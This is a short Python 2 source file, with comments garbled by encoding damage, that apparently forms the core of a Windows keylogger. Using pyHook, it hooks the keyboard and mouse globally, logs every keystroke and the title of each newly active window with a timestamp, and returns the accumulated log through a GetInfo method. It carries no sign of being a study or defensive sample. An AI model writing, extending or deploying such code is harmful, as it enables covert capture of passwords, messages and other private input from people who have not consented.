# -*- coding: utf-8 -*-
import pyHook
import pythoncom
import time
import thread

class RecordMessage:
	def __init__(self):
		# ����һ�������ӡ��������
		self.hm = pyHook.HookManager()
		self.beforeWindow = ''
		self.log = ''
		self.aline = ''
		self.mylock = thread.allocate_lock()

	def onKeyboardEvent(self,event):
		self.mylock.acquire()
		if event.Ascii == 13:
			self.log += '\n\r'
			print('\n\r')
		elif event.Ascii == 8:
			self.log = self.log[:-1]
		else:
			self.log += chr(event.Ascii)
			print(chr(event.Ascii))
		self.mylock.release()
		return True
		
	def onMouseEvent(self,event):
		eventWinName = str(event.WindowName)
		if (self.beforeWindow != eventWinName)&(eventWinName!='N')&(eventWinName!='None')&(eventWinName!='Tab')&(eventWinName!='����Ӧ�ó���'):
			strtime = time.strftime('%d-%H:%M:%S',time.localtime())
			self.mylock.acquire()
			self.log += "\n\r" + eventWinName+" at "+strtime + "\n\r"
			print(str(event.WindowName) + "\n\r")
			self.beforeWindow = event.WindowName
			self.mylock.release()
		return True
		
	def go(self):
		# �������м����¼�
		self.hm.KeyDown = self.onKeyboardEvent
		# ���ü��̡����ӡ�
		self.hm.HookKeyboard()

		# ������������¼�
		self.hm.MouseAll = self.onMouseEvent
		# ������ꡰ���ӡ�
		self.hm.HookMouse()

		# ����ѭ�����粻�ֶ��رգ�����һֱ���ڼ���״̬
		thread.start_new_thread(pythoncom.PumpMessages(),())
		
	def GetInfo(self):
		self.mylock.acquire()
		log = self.log
		self.log = ''
		self.mylock.release()
		return log